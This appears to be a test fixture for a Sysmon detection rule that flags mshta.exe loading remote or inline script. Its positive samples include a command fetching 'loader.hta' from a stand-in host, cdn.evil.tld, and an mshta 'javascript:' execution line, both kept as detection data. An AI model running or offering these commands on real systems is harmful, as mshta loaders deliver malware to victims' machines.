rule: sysmon-mshta-http

positive:
  - description: mshta fetching remote HTA over HTTPS
    event:
      commandline: 'mshta.exe https://cdn.evil.tld/loader.hta'
  - description: mshta with javascript protocol
    event:
      commandline: "mshta.exe javascript:document.write('payload')"

negative:
  - description: mshta without protocol (local file)
    event:
      commandline: 'mshta.exe C:\Windows\Help\local.hta'
  - description: PowerShell making HTTPS request (different rule)
    event:
      commandline: 'powershell.exe Invoke-WebRequest https://example.test'
